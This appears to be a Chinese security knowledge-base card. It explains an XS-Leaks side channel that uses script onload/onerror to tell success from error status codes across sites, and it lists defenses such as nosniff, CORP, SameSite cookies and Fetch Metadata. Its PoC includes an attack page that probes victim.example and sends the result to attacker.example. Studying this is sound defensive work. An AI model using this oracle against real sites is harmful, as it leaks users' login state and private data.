---
id: web-generic-xs-leaks-script-onload-status-code-oracle
title: XS-Leaks 状态码 oracle：script onload/onerror 跨站区分 200 与 4xx/5xx
type: scenario
domain: web
path: web/generic/xs-leaks
technique: xs-leaks-script-status-code-oracle
aliases:
- 状态码侧信道
- error-based side-channel
- script onload onerror
- HTTP 状态码探测
- Twitter ID exposure
tags:
- web
- xs-leaks
- side-channel
- status-code
- script
- onload
- onerror
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V218
  verified_at: '2026-11-07T04:52:15+08:00'
  notes: 已对照原文与图05-06核对：/200虽text/html仍加载并触发onload（控制台SyntaxError），/400触发加载失败，状态码oracle成立；未复跑。dup-scan均为related，保留。
---

## 一句话结论

`<script src>` 在响应状态成功（200/2xx）时会触发 `onload`，即使响应体不是 JavaScript、Content-Type 是 `text/html`，未设置 `nosniff` 时浏览器仍会加载并执行/解析，只是控制台报语法错误；状态码 4xx/5xx 则触发 `onerror`。攻击页据此跨站区分某 URL 返回成功还是错误，从而推断资源是否存在、用户是否有权限或是否登录。

## 原理

- `<script>` 的 `load` 事件表示资源获取成功，`error` 事件表示获取失败（网络错误、HTTP 4xx/5xx、被策略阻止），而不是“脚本是否有语法错误”。语法错误只在控制台报告，不会触发 `error`。
- 因此当响应为 `200 + text/html + <h1>hello</h1>` 时，Chrome 仍会把响应体当脚本加载：先触发 `load`，解析时抛 `SyntaxError`；而 `400` 响应触发 `error`。文章的控制台截图同时出现“仍已加载来自 /200 的脚本”“SyntaxError: expected expression”和“/400 的 script 加载失败”，验证了这两个事件语义。
- 跨域脚本加载本身不要求 CORS（传统 `<script src>`）；攻击者不能读取响应体，但能观察到 `load/error`，所以状态码差异就成为一个跨站布尔 oracle。
- 若目标接口在“存在/不存在”“有权限/无权限”“已登录/未登录”时返回不同状态码，攻击者即可把该差异映射为信息位；结合二分或枚举，可探测用户 ID、资源 ID、私有对象是否存在等。

## 触发条件

- 目标响应可被跨站 `<script src>` 加载；未设置 `X-Content-Type-Options: nosniff`（若设置，200 的 HTML 也会被拒绝而触发 `error`，状态码差异可能被抹平）。
- Cookie 会随跨站脚本请求发送（Cookie 未设置 `SameSite=Lax/Strict`，或为 `SameSite=None`），服务端才能返回与用户状态相关的状态码。
- 目标在两种被区分状态下返回稳定的 2xx 与 4xx/5xx 差异。
- 目标没有用 `Cross-Origin-Resource-Policy` 阻止跨站加载。

## 利用步骤

1. 找出会根据用户状态/资源存在性返回不同状态码的端点，确认响应可被 `<script src>` 引用。
2. 在攻击页创建 `<script>` 元素，注册 `onload` 与 `onerror`；`onload` 代表成功，`onerror` 代表失败。
3. 对单个布尔判断直接记录结果；对 ID/用户枚举，按返回结果做二分或逐值扫描。
4. 把结果回传到攻击者服务器；重复探测时可为每个探测点创建新的 script 元素并设置超时兜底。

## PoC

目标服务端示例（仅用于说明状态码差异）：

```js
app.get('/200', (req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end('<h1>hello</h1>');
});
app.get('/400', (req, res) => {
  res.writeHead(400);
  res.end();
});
```

攻击页 oracle：

```html
<script>
  function probe(url) {
    return new Promise((resolve) => {
      const s = document.createElement('script');
      s.src = url;
      s.onload = () => resolve('status-ok');   // 200/2xx
      s.onerror = () => resolve('status-error'); // 4xx/5xx/网络失败
      document.head.appendChild(s);
    });
  }
  probe('https://victim.example/api/private/123').then((r) => {
    new Image().src = 'https://attacker.example/leak?r=' + r;
  });
</script>
```

说明：目标返回 200 时即使 body 是 HTML，`onload` 也会触发；返回 400 时触发 `onerror`。文章引用的 Twitter “error-based side-channel” 报告即利用这类状态码差异泄露用户 ID。

## 变体与关联

- 变体：用 `<link rel="stylesheet">` 的 `load/error` 或 `<img>` 的 `load/error` 做类似状态判断，但 `<img>` 还会受内容是否为图片影响，适合判断“最终是否为图片”，本卡的 script 更适合判断“状态码是否成功”。
- 变体：配合重定向链，观察最终 URL 是否成功加载，推断跳转目标是否存在。
- 变体：设置较短的超时时间，把“既不 load 也不 error”的挂起状态也作为一种结果。
- 关联：[[web-generic-xs-leaks-img-onload-onerror-login-detect]]（用图片内容类型差异判断登录态）。
- 关联：[[web-generic-xs-leaks-cache-probing]]（用缓存命中/加载时间判断状态）。
- 边界：设置 `X-Content-Type-Options: nosniff` 后，200 + 非 JavaScript MIME 也会触发 `error`，脚本状态码 oracle 失效；`Cross-Origin-Resource-Policy`、Fetch Metadata 拒绝 `Sec-Fetch-Dest: script` 的跨站请求、SameSite Cookie 都会切断该链路。

## 检测与防御

- 检测：跨站页面引用站内接口/JSON 端点作为 `<script src>`；请求出现 `Sec-Fetch-Site: cross-site`、`Sec-Fetch-Dest: script`；同一接口被大量枚举式请求。
- 防御：对会随用户状态变化的状态码做统一，成功与失败都返回 200（用业务字段表达错误），或统一返回不可区分的错误页。
- 加固：设置 `X-Content-Type-Options: nosniff`，让非 JavaScript MIME 的响应无法被 `<script>` 加载；对敏感接口设置 `Cross-Origin-Resource-Policy: same-origin`；Cookie 使用 `SameSite=Lax/Strict`；用 Fetch Metadata 拒绝跨站 `script`/`fetch` 请求。
